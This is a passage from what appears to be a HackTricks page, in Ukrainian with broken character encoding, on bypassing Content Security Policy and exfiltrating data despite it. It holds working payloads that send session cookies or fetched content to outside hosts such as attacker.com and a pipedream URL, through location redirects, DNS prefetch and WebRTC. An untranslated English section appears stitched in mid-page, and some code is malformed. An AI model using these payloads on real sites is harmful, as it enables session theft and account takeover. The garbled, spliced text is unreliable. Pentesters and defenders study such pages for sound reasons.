### –ü–µ—Ä–µ–∑–∞–ø–∏—Å –°—Ç–æ—Ä—ñ–Ω–∫–∏ –ü–æ–º–∏–ª–∫–∏

–ó [**—Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://blog.ssrf.kr/69) –∑–¥–∞—î—Ç—å—Å—è, —â–æ –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç CSP, –∑–∞–≤–∞–Ω—Ç–∞–∂–∏–≤—à–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ø–æ–º–∏–ª–∫–∏ (–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –±–µ–∑ CSP) —Ç–∞ –ø–µ—Ä–µ–ø–∏—Å–∞–≤—à–∏ —ó—ó –≤–º—ñ—Å—Ç.

```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```

### SOME + 'self' + wordpress

SOME - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –∑–ª–æ–≤–∂–∏–≤–∞—î XSS (–∞–±–æ –¥—É–∂–µ –æ–±–º–µ–∂–µ–Ω–∏–π XSS) **–≤ –∫—ñ–Ω—Ü–µ–≤—ñ–π —Ç–æ—á—Ü—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏**, —â–æ–± **–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏** **—ñ–Ω—à–∏–º–∏ –∫—ñ–Ω—Ü–µ–≤–∏–º–∏ —Ç–æ—á–∫–∞–º–∏ —Ç–æ–≥–æ –∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è.** –¶–µ —Ä–æ–±–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞, –∞ –ø–æ—Ç—ñ–º –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞ –¥–æ —Ä–µ–∞–ª—å–Ω–æ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –≤ —Ç–æ–º—É –∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—ñ, —è–∫—É –≤–∏ —Ö–æ—á–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏. –¢–∞–∫–∏–º —á–∏–Ω–æ–º **–≤—Ä–∞–∑–ª–∏–≤–∞ –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞** –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç **`opener`** –≤ **–ø–µ–π–ª–æ—É–¥—ñ**, —â–æ–± **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ DOM** **—Ä–µ–∞–ª—å–Ω–æ—ó –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è**. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

–ö—Ä—ñ–º —Ç–æ–≥–æ, **wordpress** –º–∞—î **JSONP** –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É –≤ `/wp-json/wp/v2/users/1?_jsonp=data`, —è–∫–∞ –±—É–¥–µ **–≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏** **–¥–∞–Ω—ñ**, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω—ñ —É –≤–∏–≤–µ–¥–µ–Ω–Ω—ñ (–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è–º –ª–∏—à–µ –ª—ñ—Ç–µ—Ä, —Ü–∏—Ñ—Ä —Ç–∞ –∫—Ä–∞–ø–æ–∫).

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é –∫—ñ–Ω—Ü–µ–≤–æ—é —Ç–æ—á–∫–æ—é, —â–æ–± **–∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –∞—Ç–∞–∫—É SOME** –ø—Ä–æ—Ç–∏ WordPress —Ç–∞ **–≤–±—É–¥—É–≤–∞—Ç–∏** —ó—ó –≤—Å–µ—Ä–µ–¥–∏–Ω—É `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>`, —Å–ª—ñ–¥ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Ü–µ–π **—Å–∫—Ä–∏–ø—Ç** –±—É–¥–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ**, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω **–¥–æ–∑–≤–æ–ª–µ–Ω–∏–π 'self'**. –ö—Ä—ñ–º —Ç–æ–≥–æ, —ñ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ WordPress –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ **–∞—Ç–∞–∫–æ—é SOME** —á–µ—Ä–µ–∑ **–≤—Ä–∞–∑–ª–∏–≤—É** **–∫–æ–ª–±–µ–∫** –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É, —è–∫–∞ **–æ–±—Ö—ñ–¥ CSP** –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –±—ñ–ª—å—à –≤–∏—Å–æ–∫–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É, –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø–ª–∞–≥—ñ–Ω–∞...\
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ç–µ, —è–∫ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü—é –∞—Ç–∞–∫—É, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Bypasses –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó

–Ø–∫—â–æ —î —Å—Ç—Ä–æ–≥–∞ CSP, —è–∫–∞ –Ω–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º **–≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ–º–∏ —Å–µ—Ä–≤–µ—Ä–∞–º–∏**, —î –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π, —è–∫—ñ –≤–∏ –∑–∞–≤–∂–¥–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

### Location

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –æ–Ω–æ–≤–∏—Ç–∏ –º—ñ—Å—Ü–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è, —â–æ–± –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Å–µ–∫—Ä–µ—Ç–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```

### –ú–µ—Ç–∞-—Ç–µ–≥

–í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏, –≤–ø—Ä–æ–≤–∞–¥–∏–≤—à–∏ –º–µ—Ç–∞-—Ç–µ–≥ (—Ü–µ –ª–∏—à–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, —Ü–µ –Ω–µ –≤–∏—Ç—ñ–∫–∞—î –≤–º—ñ—Å—Ç—É)

```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```

### DNS Prefetch

–î–ª—è —à–≤–∏–¥–∫–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å—Ç–æ—Ä—ñ–Ω–æ–∫ –±—Ä–∞—É–∑–µ—Ä–∏ –±—É–¥—É—Ç—å –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Ä–æ–∑–≥–∞–¥—É–≤–∞—Ç–∏ —ñ–º–µ–Ω–∞ —Ö–æ—Å—Ç—ñ–≤ —É IP-–∞–¥—Ä–µ—Å–∏ —Ç–∞ –∫–µ—à—É–≤–∞—Ç–∏ —ó—Ö –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.\
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∫–∞–∑–∞—Ç–∏ –±—Ä–∞—É–∑–µ—Ä—É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Ä–æ–∑–≥–∞–¥–∞—Ç–∏ —ñ–º'—è —Ö–æ—Å—Ç–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `<link rel="dns-prefetch" href="something.com">`

–í–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é –¥–ª—è **–µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –∑–∞–ø–∏—Ç–∏ DNS**:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```

### CSP Bypass

#### Content Security Policy (CSP) Bypass

**Bypassing CSP using `script-src`**

If the CSP header allows scripts from a specific domain, you can try to load a script from a subdomain of that domain. For example, if the CSP header allows scripts from `example.com`, you can try to load a script from `subdomain.example.com`.

```html
<script src="https://subdomain.example.com/evil.js"></script>
```

This technique can sometimes bypass the CSP restrictions.

**Bypassing CSP using `unsafe-inline`**

If the CSP header allows inline scripts using `unsafe-inline`, you can execute arbitrary JavaScript code directly in the HTML.

```html
<script>alert('CSP bypassed!')</script>
```

This technique allows you to bypass CSP restrictions by executing inline scripts.

**Bypassing CSP using `nonce`**

If the CSP header uses a nonce to allow specific inline scripts, you can try to inject a script tag with the correct nonce value.

```html
<script nonce="random-nonce-value">alert('CSP bypassed!')</script>
```

By injecting a script tag with the correct nonce value, you can bypass CSP restrictions that rely on nonces.

```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

–î–ª—è —Ç–æ–≥–æ —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ —Ü—å–æ–≥–æ, —Å–µ—Ä–≤–µ—Ä –º–æ–∂–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ HTTP –∑–∞–≥–æ–ª–æ–≤–æ–∫:

```
X-DNS-Prefetch-Control: off
```

{% hint style="info" %}
–ó–¥–∞—î—Ç—å—Å—è, —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –Ω–µ –ø—Ä–∞—Ü—é—î –≤ –±–µ–∑–≥–æ–ª–æ–≤–∏—Ö –±—Ä–∞—É–∑–µ—Ä–∞—Ö (–±–æ—Ç–∞—Ö)
{% endhint %}

### WebRTC

–ù–∞ –¥–µ–∫—ñ–ª—å–∫–æ—Ö —Å—Ç–æ—Ä—ñ–Ω–∫–∞—Ö –º–æ–∂–Ω–∞ –ø—Ä–æ—á–∏—Ç–∞—Ç–∏, —â–æ **WebRTC –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø–æ–ª—ñ—Ç–∏–∫—É `connect-src`** CSP.

–§–∞–∫—Ç–∏—á–Ω–æ, –≤–∏ –º–æ–∂–µ—Ç–µ _–≤–∏—Ç—ñ–∫–∞—Ç–∏_ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ _DNS –∑–∞–ø–∏—Ç_. –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ–π –∫–æ–¥:

```javascript
(async()=>{p=new RTCPeerConnection({iceServers:[{urls: "stun:LEAK.dnsbin"}]});p.createDataChannel('');p.setLocalDescription(await p.createOffer())})()
```

–Ü–Ω—à–∞ –æ–ø—Ü—ñ—è:

```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```

## –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–ª—ñ—Ç–∏–∫ CSP –æ–Ω–ª–∞–π–Ω

* [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
* [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
* [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
* [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
* [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
* [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
* [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), —â–æ–± —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è –∑ –¥–æ—Å–≤—ñ–¥—á–µ–Ω–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ —Ç–∞ –º–∏—Å–ª–∏–≤—Ü—è–º–∏ –∑–∞ –±–∞–≥–∞–º–∏!

**–Ü–Ω—Å–∞–π—Ç–∏ —â–æ–¥–æ —Ö–∞–∫—ñ–Ω–≥—É**\
–í–∑–∞—î–º–æ–¥—ñ–π—Ç–µ –∑ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, —è–∫–∏–π –¥–æ—Å–ª—ñ–¥–∂—É—î –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–ª–∏–∫–∏ —Ö–∞–∫—ñ–Ω–≥—É

**–ù–æ–≤–∏–Ω–∏ –ø—Ä–æ —Ö–∞–∫—ñ–Ω–≥ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ —à–≤–∏–¥–∫–æ–∑–º—ñ–Ω–Ω–æ–≥–æ —Å–≤—ñ—Ç—É —Ö–∞–∫—ñ–Ω–≥—É –∑–∞–≤–¥—è–∫–∏ –Ω–æ–≤–∏–Ω–∞–º —Ç–∞ —ñ–Ω—Å–∞–π—Ç–∞–º —É —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ

**–û—Å—Ç–∞–Ω–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**\
–ë—É–¥—å—Ç–µ –≤ –∫—É—Ä—Å—ñ –Ω–∞–π–Ω–æ–≤—ñ—à–∏—Ö –±–∞–≥-–±–∞—É–Ω—Ç—ñ, —è–∫—ñ –∑–∞–ø—É—Å–∫–∞—é—Ç—å—Å—è, —Ç–∞ –≤–∞–∂–ª–∏–≤–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏

**–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞** [**Discord**](https://discord.com/invite/N3FrSbmwdy) —Ç–∞ –ø–æ—á–Ω—ñ—Ç—å —Å–ø—ñ–≤–ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –∑ —Ç–æ–ø–æ–≤–∏–º–∏ —Ö–∞–∫–µ—Ä–∞–º–∏ –≤–∂–µ —Å—å–æ–≥–æ–¥–Ω—ñ!

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
